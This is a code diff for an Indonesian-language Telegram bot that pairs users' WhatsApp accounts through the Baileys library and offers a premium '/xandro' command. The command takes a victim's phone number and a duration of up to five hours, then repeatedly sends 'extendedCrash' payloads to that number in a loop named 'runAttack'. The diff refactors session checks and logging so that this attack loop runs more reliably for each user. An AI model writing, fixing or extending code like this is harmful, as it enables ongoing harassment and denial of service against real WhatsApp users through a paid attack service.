@@ -556,6 +556,7 @@ function hasActiveSession(userId) {
 // ============================================
 // START USER SESSION
 // ============================================
+
 const startUserSession = async (userId, phoneNumber = null) => {
   const {
     default: makeWASocket,
@@ -563,10 +564,8 @@ const startUserSession = async (userId, phoneNumber = null) => {
     DisconnectReason,
     fetchLatestBaileysVersion
   } = require('@whiskeysockets/baileys');
-  
   const maxRetries = 3;
   const retryDelay = 5000;
-  
   let userSession = userSessions.get(userId);
   if (!userSession) {
     userSession = {
@@ -576,19 +575,19 @@ const startUserSession = async (userId, phoneNumber = null) => {
       retryCount: 0
     };
     userSessions.set(userId, userSession);
+    console.log(`📝 Created new session for user ${userId}`);
   }
-  
   const escapeHTML = (s) => String(s ?? "")
     .replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
+    .replace(/>/g, "&gt;");  
   
   const attemptConnection = async () => {
     try {
+      console.log(`🔄 Attempting connection for user ${userId}...`);    
       const userSessionPath = getUserSessionPath(userId);
       const { state, saveCreds } = await useMultiFileAuthState(userSessionPath);
-      const { version } = await fetchLatestBaileysVersion();
-      
+      const { version } = await fetchLatestBaileysVersion();    
       const connectionOptions = {
         version,
         keepAliveIntervalMs: 30000,
@@ -601,33 +600,34 @@ const startUserSession = async (userId, phoneNumber = null) => {
         }),
         connectTimeoutMs: 60000,
         qrTimeout: 30000,
-      };
-      
+      };    
       const sock = makeWASocket(connectionOptions);
       sock.ev.on('creds.update', saveCreds);
-      
       userSession = userSessions.get(userId);
       if (userSession) {
         userSession.sock = sock;
+        console.log(`✅ Socket created for user ${userId}`);
       }
-      
       sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect } = update;
-        
         if (connection === 'open') {
           userSession = userSessions.get(userId);
           if (userSession) {
             userSession.isConnected = true;
             userSession.retryCount = 0;
+            
+            // Simpan nomor WhatsApp
             if (!userSession.phoneNumber && sock?.user?.id) {
               userSession.phoneNumber = sock.user.id.split(':')[0];
             }
-          }
-          
+            
+            console.log(`✅ User ${userId} WhatsApp Connected`);
+            console.log(`📱 Phone: ${userSession.phoneNumber}`);
+            console.log(`🔗 Session Status: ACTIVE`);
+          }        
           const safeUserIdHTML = escapeHTML(userId);
           const waNameHTML = escapeHTML(sock?.user?.name || "Unknown");
-          const waNumberHTML = escapeHTML(sock?.user?.id?.split(":")[0] || "Unknown");
-          
+          const waNumberHTML = escapeHTML(sock?.user?.id?.split(":")[0] || "Unknown");      
           const successMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
     ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ sᴛᴀᴛᴜs ⸸
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -655,7 +655,6 @@ const startUserSession = async (userId, phoneNumber = null) => {
             await bot.telegram.sendMessage(userId, successMessage, {
               parse_mode: "HTML"
             });
-            
             if (allowedDevelopers.includes(userId) || adminList.includes(userId)) {
               for (const ownerId of allowedDevelopers) {
                 if (ownerId !== userId) {
@@ -669,17 +668,15 @@ const startUserSession = async (userId, phoneNumber = null) => {
             }
           } catch (error) {
             console.error(`Error sending connect notification to user ${userId}:`, error);
-          }
-          
+          }        
           console.log(chalk.green.bold(`✅ User ${userId} WhatsApp Connected`));
         }
-        
         if (connection === 'close') {
           userSession = userSessions.get(userId);
           if (userSession) {
             userSession.isConnected = false;
-          }
-          
+            console.log(`❌ User ${userId} connection closed`);
+          }          
           const statusCode = lastDisconnect?.error?.output?.statusCode;
           const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
           const errMsg = String(lastDisconnect?.error?.message || "");
@@ -759,7 +756,7 @@ const startUserSession = async (userId, phoneNumber = null) => {
               console.error(`Error handling ban for user ${userId}:`, error);
             }
           }
-          
+
           if (userSession && userSession.retryCount < maxRetries && shouldReconnect) {
             userSession.retryCount++;
             const disconnectTimeHTML = escapeHTML(new Date().toLocaleString());
@@ -867,12 +864,10 @@ const startUserSession = async (userId, phoneNumber = null) => {
         }
       });
       
-      return sock;
-      
+      return sock;   
     } catch (error) {
-      console.error(`Connection error for user ${userId}:`, error);
-      userSession = userSessions.get(userId);
-      
+      console.error(`❌ Connection error for user ${userId}:`, error);
+      userSession = userSessions.get(userId);     
       if (userSession && userSession.retryCount < maxRetries) {
         userSession.retryCount++;
         console.log(chalk.yellow.bold(`🔄 User ${userId} Retry ${userSession.retryCount}/${maxRetries}`));
@@ -896,6 +891,7 @@ const startUserSession = async (userId, phoneNumber = null) => {
   
   return attemptConnection();
 };
+
 
 // ============================================
 // LOAD EXISTING SESSIONS
@@ -2023,16 +2019,14 @@ const checkWhatsAppConnection = async (ctx, next) => {
   const userId = String(ctx.from.id);
   const session = userSessions.get(userId);
   if (session && session.isConnected && session.sock) {
+    console.log(`✅ User ${userId} terdeteksi terkoneksi`);
     return await next();
   }
-  if (sock && isWhatsAppConnected) {
-    return await next();
-  }
+  console.log(`❌ User ${userId} tidak terkoneksi`);
   await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing", {
     reply_to_message_id: getReplyMessageId(ctx)
   });
 };
-
 
 function formatPhoneNumber(number) {
   let cleaned = number.replace(/[^0-9]/g, '');
@@ -2043,14 +2037,16 @@ function formatPhoneNumber(number) {
   if (!cleaned.startsWith('62')) {
     cleaned = '62' + cleaned;
   }
+  
   return cleaned;
 }
-//s
+
 bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
   await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
-  const userId = ctx.from.id;
+  const userId = String(ctx.from.id);
   const st = getUserState(userId);
   const now = Date.now();
+  
   if (st?.state === "running") {
     const remaining = (st.endAt || now) - now;
     return await ctx.reply(
@@ -2081,13 +2077,15 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
       }
     );
   }
-  if (activeRunLocks.has(String(userId))) {
+  
+  if (activeRunLocks.has(userId)) {
     return await ctx.reply(
       "⏳ Perintahmu lagi diproses. Tunggu sampai selesai ya.", {
         reply_to_message_id: ctx.message.message_id
       }
     );
   }
+  
   const args = ctx.message.text.split(/\s+/);
   if (args.length < 3) {
     return await ctx.reply(
@@ -2107,50 +2105,70 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
       }
     );
   }
+  
   const nomorHP = args[1];
-  const durationInput = String(args[2])
-    .toLowerCase();
+  const durationInput = String(args[2]).toLowerCase();
   let durationMs = 0;
+  
   if (durationInput.endsWith("m")) {
     const minutes = parseInt(durationInput.replace("m", ""), 10);
-    if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
+    if (isNaN(minutes) || minutes < 1) {
+      return await ctx.reply("❌ Menit tidak valid!");
+    }
     durationMs = minutes * 60 * 1000;
   } else if (durationInput.endsWith("j")) {
     const hours = parseInt(durationInput.replace("j", ""), 10);
-    if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
-    if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
+    if (isNaN(hours) || hours < 1) {
+      return await ctx.reply("❌ Jam tidak valid!");
+    }
+    if (hours > 5) {
+      return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
+    }
     durationMs = hours * 60 * 60 * 1000;
   } else {
     return await ctx.reply(
-      "❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
+      "❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)"
+    );
   }
+  
   const nomorFix = formatPhoneNumber(nomorHP);
   const target = nomorFix + "@s.whatsapp.net";
   const startedAt = Date.now();
   const endAt = startedAt + durationMs;
-  activeRunLocks.add(String(userId));
+  activeRunLocks.add(userId);
   setUserRunning(userId, {
     startedAt,
     endAt,
     durationMs,
     lastTarget: nomorFix
   });
+  
   await prosesrespone(target, ctx);
   const runAttack = async () => {
     try {
+      const session = userSessions.get(userId);      
       while (Date.now() < endAt) {
-        if (!isWhatsAppConnected) break;
+        if (!session || !session.isConnected || !session.sock) {
+          console.log(`❌ User ${userId} koneksi terputus saat attack`);
+          await ctx.reply(
+            "❌ Koneksi WhatsApp terputus! Proses dihentikan.", {
+              reply_to_message_id: ctx.message.message_id
+            }
+          );
+          break;
+        }      
         await extendedCrash(target);
         await sleep(3000);
       }
     } catch (err) {
-      console.error("runAttack error:", err);
+      console.error(`❌ runAttack error for user ${userId}:`, err);
     } finally {
       try {
         await donerespone(target, ctx);
       } catch (e) {
-        console.error("donerespone error:", e);
+        console.error(`❌ donerespone error for user ${userId}:`, e);
       }
+      
       const until = Date.now() + COOLDOWN_AFTER_DONE_MS;
       setUserCooldown(userId, {
         until,
@@ -2158,12 +2176,14 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
         lastDoneAt: Date.now()
       });
 
-      activeRunLocks.delete(String(userId));
+      // Hapus lock
+      activeRunLocks.delete(userId);
     }
   };
+  
+  // Jalankan attack
   runAttack();
 });
-
 
 // ===== START MENU =====
 bot.start(async (ctx) => {
